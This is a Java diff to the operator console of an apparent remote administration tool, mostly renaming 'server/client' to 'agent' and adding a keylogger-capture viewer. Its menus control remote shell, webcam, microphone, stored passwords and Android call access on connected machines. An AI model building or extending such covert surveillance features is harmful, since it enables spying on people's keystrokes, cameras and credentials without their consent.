@@ -97,11 +97,11 @@ public class ModoAvanzado extends JFrame {
 
     private JTree arbolOpciones;
     private JToolBar barra;
-    private JButton btnCrearServidor = null;
+    private JButton btnCrearAgente = null;
     private JButton btnAcerca = null;
     private JButton btnCambiar = null;
     private JButton btnMapa = null;
-    private JButton btnAgregarServidor = null;
+    private JButton btnAgregarAgente = null;
     private JButton btnEscritorioRemoto = null;
     private JButton btnCamara = null;
     private JButton btnAdminArchivos = null;
@@ -112,9 +112,9 @@ public class ModoAvanzado extends JFrame {
     private JButton btnArchivosOfflineVisor = null;
     private JPanel contenedorPrincipal;
     private JPopupMenu ppmnuServer;
-    private JMenu menuServidor;
+    private JMenu menuAgente;
     private JMenu menuApagar;
-    private JMenu menuControlserver;
+    private JMenu menuControlAgente;
     private JMenuItem itmAbrirUrl;
     private JMenuItem itmBuscarIp;
     private JMenuItem itmEscritorioRemoto;
@@ -130,7 +130,7 @@ public class ModoAvanzado extends JFrame {
     private JMenuItem itmChat;
     private JMenuItem itmReiniciarEquipo;
     private JMenuItem itmApagarEquipo;
-    private JMenuItem itmReiniciarServidor;
+    private JMenuItem itmReiniciarAgente;
     private JMenuItem itmApagarServidor;
     private JMenuItem itmEnviarPlgInWC;
     private JMenuItem itmEnviarPlgInJNA;
@@ -203,14 +203,14 @@ public class ModoAvanzado extends JFrame {
             }
         });
         barra.add(btnIniciar);
-        btnCrearServidor = GuiUtil.crearJButton("Crear cliente", "Crear cliente", Util.cargarIcono16("/resources/computer.png"), false);
-        btnCrearServidor.addActionListener(new ActionListener() {
+        btnCrearAgente = GuiUtil.crearJButton("Crear agente", "Crear agente", Util.cargarIcono16("/resources/computer.png"), false);
+        btnCrearAgente.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent evt) {
                 btnCrearServidorActionPerformed(evt);
             }
         });
-        barra.add(btnCrearServidor);
+        barra.add(btnCrearAgente);
         btnAcerca = GuiUtil.crearJButton("Acerca de", "Acerca de", Util.cargarIcono16("/resources/info.png"), false);
         btnAcerca.addActionListener(new ActionListener() {
             @Override
@@ -253,8 +253,8 @@ public class ModoAvanzado extends JFrame {
         barra.add(btnMapa);
 
         barra.addSeparator();
-        btnAgregarServidor = GuiUtil.crearJButton("", "Agregar Cliente (Conexión Directa)", Util.cargarIcono16("/resources/connect.png"), false);
-        this.btnAgregarServidor.addActionListener(new ActionListener() {
+        btnAgregarAgente = GuiUtil.crearJButton("", "Agregar Agente (Conexión Directa)", Util.cargarIcono16("/resources/connect.png"), false);
+        this.btnAgregarAgente.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent evt) {
                 try {
@@ -265,7 +265,7 @@ public class ModoAvanzado extends JFrame {
                 }
             }
         });
-        barra.add(btnAgregarServidor);
+        barra.add(btnAgregarAgente);
         btnEscritorioRemoto = GuiUtil.crearJButton("", "Escritorio Remoto", Util.cargarIcono16("/resources/remoto.png"), false);
         this.btnEscritorioRemoto.addActionListener(new ActionListener() {
             @Override
@@ -282,7 +282,7 @@ public class ModoAvanzado extends JFrame {
             }
         });
         barra.add(btnCamara);
-        btnAdminArchivos = GuiUtil.crearJButton("", "Administrador de  archivos", Util.cargarIcono16("/resources/folder.png"), false);
+        btnAdminArchivos = GuiUtil.crearJButton("", "Administrador de archivos", Util.cargarIcono16("/resources/folder.png"), false);
         this.btnAdminArchivos.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent evt) {
@@ -298,7 +298,7 @@ public class ModoAvanzado extends JFrame {
             }
         });
         barra.add(btnMicrofono);
-        btnConsola = GuiUtil.crearJButton("", "Consola remota", Util.cargarIcono16("/resources/cmd.png"), false);
+        btnConsola = GuiUtil.crearJButton("", "Consola remota / Shell", Util.cargarIcono16("/resources/cmd.png"), false);
         this.btnConsola.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent evt) {
@@ -322,6 +322,15 @@ public class ModoAvanzado extends JFrame {
             }
         });
         barra.add(btnArchivosOfflineVisor);
+        JButton btnVisorKeyLogger = GuiUtil.crearJButton("", "Abrir carpeta del servidor", Util.cargarIcono16("/resources/key_ctrl.png"), false);
+        btnVisorKeyLogger.addActionListener(new ActionListener() {
+            @Override
+            public void actionPerformed(ActionEvent evt) {
+                abrirKeyloggerVisor(evt);
+            }
+        });
+        barra.add(btnVisorKeyLogger);
+
         JButton btnCarpeta = GuiUtil.crearJButton("", "Abrir carpeta del servidor", Util.cargarIcono16("/resources/folder_search.png"), false);
         btnCarpeta.addActionListener(new ActionListener() {
             @Override
@@ -335,9 +344,9 @@ public class ModoAvanzado extends JFrame {
 //        panelNoIp.add(this.lblEstadoNoIp);
 //        MENU DE LA TABLA (adminsitrar servidor)
         this.ppmnuServer = new JPopupMenu();
-        this.menuControlserver = new JMenu();
-        this.menuControlserver.setIcon(Util.cargarIcono16("/resources/controlpanel.png"));
-        this.menuControlserver.setText("Control");
+        this.menuControlAgente = new JMenu();
+        this.menuControlAgente.setIcon(Util.cargarIcono16("/resources/controlpanel.png"));
+        this.menuControlAgente.setText("Control");
 
         //iteminfo
         this.itmInfo = GuiUtil.crearMenuItem("Información", "", Util.cargarIcono16("/resources/info.png"), true);
@@ -347,7 +356,7 @@ public class ModoAvanzado extends JFrame {
                 infoAP(evt);
             }
         });
-        menuControlserver.add(itmInfo);
+        menuControlAgente.add(itmInfo);
 
         this.itmCargaSistema = GuiUtil.crearMenuItem("CargaSistema", "", Util.cargarIcono16("/resources/monitor_load.png"), true);
         this.itmCargaSistema.addActionListener(new ActionListener() {
@@ -356,9 +365,9 @@ public class ModoAvanzado extends JFrame {
                 cargaSistemaAP(evt);
             }
         });
-        menuControlserver.add(itmCargaSistema);
+        menuControlAgente.add(itmCargaSistema);
 
-        menuControlserver.addSeparator();
+        menuControlAgente.addSeparator();
 
         menuApagar = new JMenu();
         this.menuApagar.setIcon(Util.cargarIcono16("/resources/shutdown.png"));
@@ -384,8 +393,8 @@ public class ModoAvanzado extends JFrame {
         });
         this.menuApagar.add(this.itmApagarEquipo);
 
-        menuControlserver.add(menuApagar);
-        menuControlserver.addSeparator();
+        menuControlAgente.add(menuApagar);
+        menuControlAgente.addSeparator();
 
         //item cap pantalla
         this.itmEscritorioRemoto = GuiUtil.crearMenuItem("Escritorio Remoto", "Escritorio Remoto", Util.cargarIcono16("/resources/remoto.png"), true);
@@ -395,7 +404,7 @@ public class ModoAvanzado extends JFrame {
                 escritorioRemotoAP(evt);
             }
         });
-        this.menuControlserver.add(this.itmEscritorioRemoto);
+        this.menuControlAgente.add(this.itmEscritorioRemoto);
         //item cap webcam
         this.itmCamara = GuiUtil.crearMenuItem("Cámara Remota", "Cámara Remota", Util.cargarIcono16("/resources/camera.png"), true);
         this.itmCamara.addActionListener(new ActionListener() {
@@ -404,7 +413,7 @@ public class ModoAvanzado extends JFrame {
                 camaraAP(evt);
             }
         });
-        this.menuControlserver.add(this.itmCamara);
+        this.menuControlAgente.add(this.itmCamara);
         //item cap microfono
         this.itmCapturarMicrofono = GuiUtil.crearMenuItem("VoIP", "VoIP", Util.cargarIcono16("/resources/voip.png"), true);
         this.itmCapturarMicrofono.addActionListener(new ActionListener() {
@@ -413,7 +422,7 @@ public class ModoAvanzado extends JFrame {
                 capturarMicrofonoPerformed(evt);
             }
         });
-        this.menuControlserver.add(this.itmCapturarMicrofono);
+        this.menuControlAgente.add(this.itmCapturarMicrofono);
         //item Admin Archivos
         this.itmAdminArchivos = GuiUtil.crearMenuItem("Administrador de Archivos", "Administrador de Archivos", Util.cargarIcono16("/resources/folder.png"), true);
         this.itmAdminArchivos.addActionListener(new ActionListener() {
@@ -422,25 +431,25 @@ public class ModoAvanzado extends JFrame {
                 administrarArchivosActionPerformed(evt);
             }
         });
-        this.menuControlserver.add(this.itmAdminArchivos);
+        this.menuControlAgente.add(this.itmAdminArchivos);
 
-        this.ppmnuServer.add(this.menuControlserver);
+        this.ppmnuServer.add(this.menuControlAgente);
 
         //ppmnuServer.add(this.menuApagar);
-        menuServidor = new JMenu();
-        this.menuServidor.setIcon(Util.cargarIcono16("/resources/computer.png"));
-        this.menuServidor.setText("Cliente");
+        menuAgente = new JMenu();
+        this.menuAgente.setIcon(Util.cargarIcono16("/resources/computer.png"));
+        this.menuAgente.setText("Cliente");
         //item Reiniciar Asociado
-        this.itmReiniciarServidor = new JMenuItem();
-        this.itmReiniciarServidor.setIcon(Util.cargarIcono16("/resources/restart.png"));
-        this.itmReiniciarServidor.setText("Reiniciar Cliente");
-        this.itmReiniciarServidor.addActionListener(new ActionListener() {
+        this.itmReiniciarAgente = new JMenuItem();
+        this.itmReiniciarAgente.setIcon(Util.cargarIcono16("/resources/restart.png"));
+        this.itmReiniciarAgente.setText("Reiniciar Cliente");
+        this.itmReiniciarAgente.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent evt) {
                 reiniciarServidor(evt);
             }
         });
-        this.menuServidor.add(this.itmReiniciarServidor);
+        this.menuAgente.add(this.itmReiniciarAgente);
         //item Apagar Asociado
         this.itmApagarServidor = new JMenuItem();
         this.itmApagarServidor.setIcon(Util.cargarIcono16("/resources/shutdown.png"));
@@ -451,45 +460,45 @@ public class ModoAvanzado extends JFrame {
                 apagarServidor(evt);
             }
         });
-        this.menuServidor.add(this.itmApagarServidor);
+        this.menuAgente.add(this.itmApagarServidor);
         //item ActualizarServidor
         this.itmActualizarServidor = new JMenuItem();
         this.itmActualizarServidor.setIcon(Util.cargarIcono16("/resources/update_app.png"));
-        this.itmActualizarServidor.setText("Actualizar cliente configurado");
-        this.itmActualizarServidor.setToolTipText("Sube el cliente configurado en actualización automática");
+        this.itmActualizarServidor.setText("Actualizar agente configurado");
+        this.itmActualizarServidor.setToolTipText("Sube el agente configurado en actualización automática");
         this.itmActualizarServidor.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent evt) {
                 actualizarServidorAutomatico(evt);
             }
         });
-        this.menuServidor.add(this.itmActualizarServidor);
+        this.menuAgente.add(this.itmActualizarServidor);
 
         //item itmActualizarServidorOtro
         this.itmActualizarServidorOtro = new JMenuItem();
         this.itmActualizarServidorOtro.setIcon(Util.cargarIcono16("/resources/update_app.png"));
-        this.itmActualizarServidorOtro.setText("Actualizar cliente (Seleccionar).");
-        this.itmActualizarServidorOtro.setToolTipText("Selecciona manualmente el cliente a subir.");
+        this.itmActualizarServidorOtro.setText("Actualizar agente (Seleccionar).");
+        this.itmActualizarServidorOtro.setToolTipText("Selecciona manualmente el agente a subir.");
         this.itmActualizarServidorOtro.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent evt) {
                 actualizarServidor(evt);
             }
         });
-        this.menuServidor.add(this.itmActualizarServidorOtro);
+        this.menuAgente.add(this.itmActualizarServidorOtro);
 
         //item DesinstalarServidor
         this.itmDesinstalarServidor = new JMenuItem();
         this.itmDesinstalarServidor.setIcon(Util.cargarIcono16("/resources/trash.png"));
-        this.itmDesinstalarServidor.setText("Desinstalar cliente");
+        this.itmDesinstalarServidor.setText("Desinstalar agente");
         this.itmDesinstalarServidor.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent evt) {
-                desinstalarServidor(evt);
+                desinstalarAgente(evt);
             }
         });
-        this.menuServidor.add(this.itmDesinstalarServidor);
-        ppmnuServer.add(this.menuServidor);
+        this.menuAgente.add(this.itmDesinstalarServidor);
+        ppmnuServer.add(this.menuAgente);
 
         JMenu menuPlugins = new JMenu();
         menuPlugins.setIcon(Util.cargarIcono16("/resources/plugin.png"));
@@ -517,7 +526,6 @@ public class ModoAvanzado extends JFrame {
             @Override
             public void actionPerformed(ActionEvent evt) {
                 verPluginsAP(evt);
-
             }
         });
         menuPlugins.add(itmVerPlugins);
@@ -741,8 +749,8 @@ public class ModoAvanzado extends JFrame {
         });
         this.menuPC.add(this.itmPasswords);
 
-        menuControlserver.addSeparator();
-        this.menuControlserver.add(this.menuPC);
+        menuControlAgente.addSeparator();
+        this.menuControlAgente.add(this.menuPC);
         this.menuAndroid = new JMenu();
         this.menuAndroid.setIcon(Util.cargarIcono16("/resources/android16.png"));
         this.menuAndroid.setText("Android");
@@ -790,7 +798,7 @@ public class ModoAvanzado extends JFrame {
             }
         });
         this.menuAndroid.add(this.itmAndroidLlamadas);
-        this.menuControlserver.add(this.menuAndroid);
+        this.menuControlAgente.add(this.menuAndroid);
 
 //        this.tabla.updateUI();
         //   PANEL DE INFO
@@ -1218,12 +1226,12 @@ public class ModoAvanzado extends JFrame {
         this.barra = barra;
     }
 
-    public JButton getBtnCrearServidor() {
-        return btnCrearServidor;
+    public JButton getBtnCrearAgente() {
+        return btnCrearAgente;
     }
 
-    public void setBtnCrearServidor(JButton btnCrearServidor) {
-        this.btnCrearServidor = btnCrearServidor;
+    public void setBtnCrearAgente(JButton btnCrearAgente) {
+        this.btnCrearAgente = btnCrearAgente;
     }
 
     public JButton getBtnAcerca() {
@@ -1234,12 +1242,12 @@ public class ModoAvanzado extends JFrame {
         this.btnAcerca = btnAcerca;
     }
 
-    public JButton getBtnAgregarServidor() {
-        return btnAgregarServidor;
+    public JButton getBtnAgregarAgente() {
+        return btnAgregarAgente;
     }
 
-    public void setBtnAgregarServidor(JButton btnAgregarServidor) {
-        this.btnAgregarServidor = btnAgregarServidor;
+    public void setBtnAgregarAgente(JButton btnAgregarAgente) {
+        this.btnAgregarAgente = btnAgregarAgente;
     }
 
     public JButton getBtnEscritorioRemoto() {
@@ -1322,12 +1330,12 @@ public class ModoAvanzado extends JFrame {
         this.ppmnuServer = ppmnuServer;
     }
 
-    public JMenu getMenuServidor() {
-        return menuServidor;
+    public JMenu getMenuAgente() {
+        return menuAgente;
     }
 
-    public void setMenuServidor(JMenu menuServidor) {
-        this.menuServidor = menuServidor;
+    public void setMenuAgente(JMenu menuAgente) {
+        this.menuAgente = menuAgente;
     }
 
     public JMenu getMenuApagar() {
@@ -1339,11 +1347,11 @@ public class ModoAvanzado extends JFrame {
     }
 
     public JMenu getMenuControlserver() {
-        return menuControlserver;
+        return menuControlAgente;
     }
 
     public void setMenuControlserver(JMenu menuControlserver) {
-        this.menuControlserver = menuControlserver;
+        this.menuControlAgente = menuControlserver;
     }
 
     public JMenuItem getItmAbrirUrl() {
@@ -1458,12 +1466,12 @@ public class ModoAvanzado extends JFrame {
         this.itmApagarEquipo = itmApagarEquipo;
     }
 
-    public JMenuItem getItmReiniciarServidor() {
-        return itmReiniciarServidor;
+    public JMenuItem getItmReiniciarAgente() {
+        return itmReiniciarAgente;
     }
 
-    public void setItmReiniciarServidor(JMenuItem itmReiniciarServidor) {
-        this.itmReiniciarServidor = itmReiniciarServidor;
+    public void setItmReiniciarAgente(JMenuItem itmReiniciarAgente) {
+        this.itmReiniciarAgente = itmReiniciarAgente;
     }
 
     public JMenuItem getItmApagarServidor() {
@@ -1940,6 +1948,20 @@ public class ModoAvanzado extends JFrame {
         this.chkGuardarMiniaturas = chkGuardarMiniaturas;
     }
 
+    /**
+     * Abre una ventana del keylogger sin tener un asociado para poder abrir
+     * archivos ya capturados y procesarlos
+     *
+     * @param evt
+     */
+    public void abrirKeyloggerVisor(ActionEvent evt) {
+        KeyLogger ven = new KeyLogger(null);
+        ven.setVisible(true);
+        GuiUtil.centrarVentana(ven);
+        ven.setTitle("KeyLogger [Visor]");       
+
+    }
+
     public void abrirKeylogger(ActionEvent evt) {
         for (String seleccionado : this.getEquipos().getSeleccionados()) {
             Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
@@ -2348,7 +2370,7 @@ public class ModoAvanzado extends JFrame {
         }
     }
 
-    public void desinstalarServidor(ActionEvent evt) {
+    public void desinstalarAgente(ActionEvent evt) {
         for (String seleccionado : this.getEquipos().getSeleccionados()) {
             Asociado tmp = (Asociado) QoopoRT.SERVIDORES.get(seleccionado);
             tmp.desinstalarServidor();
@@ -2549,6 +2571,7 @@ public class ModoAvanzado extends JFrame {
             serv.interrupt();
             serv = null;
             System.gc();
+
         } catch (Exception e) {
         }
     }
